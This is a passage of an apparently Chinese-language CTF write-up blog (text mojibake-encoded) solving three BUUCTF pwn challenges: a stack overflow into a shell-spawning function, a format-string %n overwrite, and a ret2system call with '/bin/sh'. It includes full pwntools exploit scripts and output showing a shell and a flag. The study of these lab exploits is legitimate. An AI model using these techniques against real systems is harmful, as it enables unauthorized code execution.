</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;q&#39;</span><span class=o>*</span><span class=p>(</span><span class=mi>128</span> <span class=o>+</span> <span class=mi>8</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>æ³¨æ„åˆ°shellcode<code>callsystem</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nl>.text:</span><span class=err>0000000000400596</span> <span class=c1>; int callsystem()
</span></span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>0000000000400596</span>                 <span class=nf>public</span> <span class=no>callsystem</span>
</span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>0000000000400596</span> <span class=nf>callsystem</span>      <span class=no>proc</span> <span class=no>near</span>
</span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>0000000000400596</span> <span class=c1>; __unwind {
</span></span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>0000000000400596</span>                 <span class=nf>push</span>    <span class=no>rbp</span>
</span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>0000000000400597</span>                 <span class=nf>mov</span>     <span class=no>rbp</span><span class=p>,</span> <span class=no>rsp</span>
</span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>000000000040059</span><span class=nf>A</span>                 <span class=no>mov</span>     <span class=no>edi</span><span class=p>,</span> <span class=no>offset</span> <span class=no>command</span> <span class=c1>; &#34;/bin/sh&#34;
</span></span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>000000000040059</span><span class=nf>F</span>                 <span class=no>call</span>    <span class=no>_system</span>
</span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>00000000004005</span><span class=nf>A4</span>                 <span class=no>pop</span>     <span class=no>rbp</span>
</span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>00000000004005</span><span class=nf>A5</span>                 <span class=no>retn</span>
</span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>00000000004005</span><span class=nf>A5</span> <span class=c1>; } // starts at 400596
</span></span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>00000000004005</span><span class=nf>A5</span> <span class=no>callsystem</span>      <span class=no>endp</span>
</span></span></code></pre></td></tr></table></div></div><p>åœ°å€ä¸º<code>40059A</code>ï¼Œæ‰€ä»¥ååŠéƒ¨åˆ†ä¸ºï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x40059A</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>å®Œæ•´ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>host</span> <span class=o>=</span> <span class=s2>&#34;node5.buuoj.cn&#34;</span>
</span></span><span class=line><span class=cl><span class=n>port</span> <span class=o>=</span> <span class=mi>25201</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sh</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=n>host</span><span class=p>,</span> <span class=n>port</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;q&#39;</span><span class=o>*</span><span class=p>(</span><span class=mi>128</span> <span class=o>+</span> <span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x40059A</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p>æ‹¿ä¸‹ï¼</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>PS C:<span class=se>\U</span>sers<span class=se>\r</span>oot&gt; <span class=p>&amp;</span> <span class=s2>&#34;D:/Program Files/python/python.exe&#34;</span> //wsl.localhost/Debian/home/wuko233/Projects/pwn/jarvisoj_level0/hack.py
</span></span><span class=line><span class=cl><span class=o>[</span>x<span class=o>]</span> Opening connection to node5.buuoj.cn on port <span class=m>25201</span>
</span></span><span class=line><span class=cl><span class=o>[</span>x<span class=o>]</span> Opening connection to node5.buuoj.cn on port 25201: Trying 117.21.200.176
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Opening connection to node5.buuoj.cn on port 25201: Done
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Switching to interactive mode
</span></span><span class=line><span class=cl>Hello, World
</span></span><span class=line><span class=cl>ls
</span></span><span class=line><span class=cl>bin
</span></span><span class=line><span class=cl>boot
</span></span><span class=line><span class=cl>dev
</span></span><span class=line><span class=cl>etc
</span></span><span class=line><span class=cl>flag
</span></span><span class=line><span class=cl>flag.txt
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>tmp
</span></span><span class=line><span class=cl>usr
</span></span><span class=line><span class=cl>var
</span></span><span class=line><span class=cl>cat flag.txt
</span></span><span class=line><span class=cl>flag<span class=o>{</span>ab0c2d86-23b2-4460-b29f-a7d2975812d6<span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=ç¬¬äº”ç©ºé—´2019-å†³èµ›pwn5-å­—ç¬¦ä¸²æ ¼å¼åŒ–æ¼æ´>[ç¬¬äº”ç©ºé—´2019 å†³èµ›]PWN5 (å­—ç¬¦ä¸²æ ¼å¼åŒ–æ¼æ´)</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>[*] &#39;/home/wuko233/Projects/pwn/[ç¬¬äº”ç©ºé—´2019 å†³èµ›]PWN5/pwn&#39;
</span></span><span class=line><span class=cl>    Arch:       i386-32-little
</span></span><span class=line><span class=cl>    RELRO:      Partial RELRO
</span></span><span class=line><span class=cl>    Stack:      Canary found
</span></span><span class=line><span class=cl>    NX:         NX enabled
</span></span><span class=line><span class=cl>    PIE:        No PIE (0x8048000)
</span></span></code></pre></td></tr></table></div></div><p>æ³¨æ„åˆ°ï¼š</p><p><strong>RELRO: Partial RELRO</strong></p><p><strong>Stack: Canary found</strong></p><p>è¿™å¾ˆåäº†ï¼Œå¼€å¯äº†æ ˆä¿æŠ¤ï¼ˆCanaryï¼‰ï¼Œä¼ ç»Ÿçš„æ ˆæº¢å‡ºè¦†ç›–è¿”å›åœ°å€çš„æ–¹å¼ä¼šè¢«æ£€æµ‹åˆ°ï¼Œå¯¼è‡´ç¨‹åºç»ˆæ­¢ã€‚å› æ­¤éœ€è¦å…ˆæ³„éœ²Canaryå€¼ï¼Œæˆ–è€…å¯»æ‰¾å…¶ä»–æ¼æ´ç‚¹ã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>v1</span><span class=p>;</span> <span class=c1>// eax
</span></span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>result</span><span class=p>;</span> <span class=c1>// eax
</span></span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>fd</span><span class=p>;</span> <span class=c1>// [esp+0h] [ebp-84h]
</span></span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>nptr</span><span class=p>[</span><span class=mi>16</span><span class=p>];</span> <span class=c1>// [esp+4h] [ebp-80h] BYREF
</span></span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=mi>100</span><span class=p>];</span> <span class=c1>// [esp+14h] [ebp-70h] BYREF
</span></span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>v6</span><span class=p>;</span> <span class=c1>// [esp+78h] [ebp-Ch]
</span></span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=o>*</span><span class=n>v7</span><span class=p>;</span> <span class=c1>// [esp+7Ch] [ebp-8h]
</span></span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>v7</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>a1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>v6</span> <span class=o>=</span> <span class=nf>__readgsdword</span><span class=p>(</span><span class=mh>0x14u</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>setvbuf</span><span class=p>(</span><span class=n>stdout</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>v1</span> <span class=o>=</span> <span class=nf>time</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>srand</span><span class=p>(</span><span class=n>v1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>fd</span> <span class=o>=</span> <span class=nf>open</span><span class=p>(</span><span class=s>&#34;/dev/urandom&#34;</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>read</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>dword_804C044</span><span class=p>,</span> <span class=mi>4u</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;your name:&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=mh>0x63u</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Hello,&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=n>buf</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;your passwd:&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>nptr</span><span class=p>,</span> <span class=mh>0xFu</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=nf>atoi</span><span class=p>(</span><span class=n>nptr</span><span class=p>)</span> <span class=o>==</span> <span class=n>dword_804C044</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;ok!!&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>system</span><span class=p>(</span><span class=s>&#34;/bin/sh&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>else</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;fail&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=n>result</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=nf>__readgsdword</span><span class=p>(</span><span class=mh>0x14u</span><span class=p>)</span> <span class=o>!=</span> <span class=n>v6</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nf>sub_80493D0</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>result</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>æ³¨æ„åˆ°<code>printf(buf);</code>ï¼Œç›´æ¥è¾“å‡ºç”¨æˆ·è¾“å…¥å†…å®¹ï¼Œè¿™é‡Œæ˜¯ä¸€ä¸ª<strong>å­—ç¬¦ä¸²æ ¼å¼åŒ–æ¼æ´</strong>ï¼š</p><p><a class=link href=https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/ target=_blank rel=noopener>CTF Wiki - Format String</a></p><p><a class=link href=https://www.freebuf.com/geek/391911.html target=_blank rel=noopener>PWNå­¦ä¹ ä¹‹æ ¼å¼åŒ–å­—ç¬¦ä¸²åŠCTFå¸¸è§åˆ©ç”¨æ‰‹æ³•</a></p><p>å½“ç¨‹åºä½¿ç”¨ <code>printf(user_input)</code> æ—¶ï¼Œå¦‚æœç”¨æˆ·è¾“å…¥åŒ…å«æ ¼å¼åŒ–å­—ç¬¦ï¼ˆå¦‚ <code>%s</code>, <code>%x</code>, <code>%n</code>ï¼‰ï¼Œä¼šè§¦å‘ä»¥ä¸‹é£é™©ï¼š</p><ul><li><p><code>%s</code>ï¼šè¯»å–ä»»æ„åœ°å€æ•°æ®</p></li><li><p><code>%x</code>ï¼šæ³„æ¼æ ˆæ•°æ®</p></li><li><p><code>%n</code>ï¼šå‘ä»»æ„åœ°å€å†™å…¥æ•°æ®ï¼ˆå†™å…¥å·²è¾“å‡ºçš„å­—ç¬¦æ•°ï¼‰</p></li></ul><p>ç”¨<code>netcat</code>è¿ä¸€ä¸‹ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nc node5.buuoj.cn <span class=m>26814</span>
</span></span></code></pre></td></tr></table></div></div><p>è¾“å…¥<code>AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p</code>ï¼Œè·å–printfæ ˆä¸Š14ä¸ªå‚æ•°ï¼š</p><p>| è¿”å›åœ°å€ | æ—§ebp | æ ¼å¼åŒ–å­—ç¬¦ä¸²æŒ‡é’ˆ | [å‚æ•°1] | [å‚æ•°2] | &mldr; |</p><p>ä¹Ÿå°±æ˜¯è¾“å…¥çš„å†…å®¹bufæŒ‡é’ˆå¾€å14ä¸ªå‚æ•°ï¼Œå¾—åˆ°ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Hello,AAAA.0xff94c828.0x63.(nil).0xff94c84e.0x3.0xc2.0xf7de691b.0xff94c84e.0xff94c94c.0x41414141.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252eDRï¿½ï¿½ï¿½ï¿½ï¿½ï¿½your passwd:
</span></span></code></pre></td></tr></table></div></div><p>æ³¨æ„åˆ°<code>0x41414141</code>å‡ºç°åœ¨ç¬¬10ä¸ªï¼Œè¯´æ˜è¾“å…¥å­—ç¬¦ä¸²çš„èµ·å§‹åœ°å€ä½äºæ ˆä¸ŠæŒ‡é’ˆåç¬¬10ä¸ªå‚æ•°çš„ä½ç½®ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨ <code>%10$</code> ç³»åˆ—æ ¼å¼åŒ–ç¬¦æ¥è®¿é—®å’Œæ“ä½œè¿™ä¸ªä½ç½®ã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>host</span> <span class=o>=</span> <span class=s2>&#34;node5.buuoj.cn&#34;</span>
</span></span><span class=line><span class=cl><span class=n>port</span> <span class=o>=</span> <span class=mi>29393</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;debug&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># p = process(&#39;./pwn&#39;)</span>
</span></span><span class=line><span class=cl><span class=n>sh</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=n>host</span><span class=p>,</span> <span class=n>port</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># rand_address_start = 0x804C044</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0x804C044</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=sa>b</span><span class=s1>&#39;%10$n&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>&#39;your name:&#39;</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>rec_data</span> <span class=o>=</span> <span class=n>sh</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;your passwd:&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=mi>4</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p>32ä½ï¼Œæ‰€ä»¥é•¿åº¦æ˜¯4ï¼ŒåŸç†å°±æ˜¯ï¼š</p><p>éšæœºæ•°ç”Ÿæˆåœ¨<code>0x804C044</code>ï¼Œæ‰€ä»¥ç›´æ¥å‘è¿™ä¸ªåœ°å€å†™å…¥ï¼Œå°±å¯ä»¥è¦†ç›–è¿™ä¸ªéšæœºæ•°ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0x804C044</span><span class=p>)</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=sa>b</span><span class=s1>&#39;%10$n&#39;</span> <span class=c1># å‘ç¬¬10ä¸ªä½ç½®å†™å…¥4</span>
</span></span></code></pre></td></tr></table></div></div><p>ç„¶åå‘é€4å°±å¾—åˆ°flagäº†qwq</p><h2 id=jarvisoj_level2>jarvisoj_level2</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> <span class=s1>&#39;/home/wuko233/Projects/pwn/jarvisoj_level2/level2&#39;</span>
</span></span><span class=line><span class=cl>    Arch:       i386-32-little
</span></span><span class=line><span class=cl>    RELRO:      Partial RELRO
</span></span><span class=line><span class=cl>    Stack:      No canary found
</span></span><span class=line><span class=cl>    NX:         NX enabled
</span></span><span class=line><span class=cl>    PIE:        No PIE <span class=o>(</span>0x8048000<span class=o>)</span>
</span></span><span class=line><span class=cl>    Stripped:   No
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>ssize_t</span> <span class=nf>vulnerable_function</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=mi>136</span><span class=p>];</span> <span class=c1>// [esp+0h] [ebp-88h] BYREF
</span></span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>system</span><span class=p>(</span><span class=s>&#34;echo Input:&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=nf>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=mi>256u</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>è¯»256ï¼Œä½†æ˜¯ç¼“å†²åŒºåªæœ‰136ï¼ŒåŒæ—¶å±…ç„¶è¿˜ç”¨ç€system()&mldr;</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>.</span><span class=n>plt</span><span class=p>:</span><span class=mi>08048320</span> <span class=p>;</span> <span class=ne>int</span> <span class=n>system</span><span class=p>(</span><span class=k>const</span> <span class=n>char</span> <span class=o>*</span><span class=n>command</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>å’Œ<a class=link href=#jarvisoj_level0-read>jarvisoj_level0</a>ä¸€æ ·ï¼Œread()æ¼æ´ã€‚</p><p>shellcodeåœ¨<code>0804A024</code>ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>.data:0804A024 hint            db &#39;/bin/sh&#39;,0
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>host</span> <span class=o>=</span> <span class=s2>&#34;node5.buuoj.cn&#34;</span>
</span></span><span class=line><span class=cl><span class=n>port</span> <span class=o>=</span> <span class=mi>26567</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;debug&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sh</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=n>host</span><span class=p>,</span> <span class=n>port</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;q&#39;</span><span class=o>*</span><span class=p>(</span><span class=mi>136</span> <span class=o>+</span> <span class=mi>4</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0x8048320</span><span class=p>)</span> <span class=c1># _system()</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0x804A024</span><span class=p>)</span> <span class=c1># str: bin/sh</span>
</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Input:&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p>åˆ©ç”¨systemå‡½æ•°æ‰§è¡Œbin/shï¼Œå…¶ä¸­0æ˜¯æŒ‡å®šçš„system()çš„è¿”å›åœ°å€ï¼Œå› ä¸ºè¦è¿›shellï¼Œæ³¨å®šä¸ä¼šè¿”å›ï¼Œæ‰€ä»¥å¯ä»¥çå†™ä¸€ä¸²æ•°å­—ï¼Œåæ¥ä¼ å…¥çš„å‚æ•°ã€‚</p><hr></section><footer class=article-footer><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
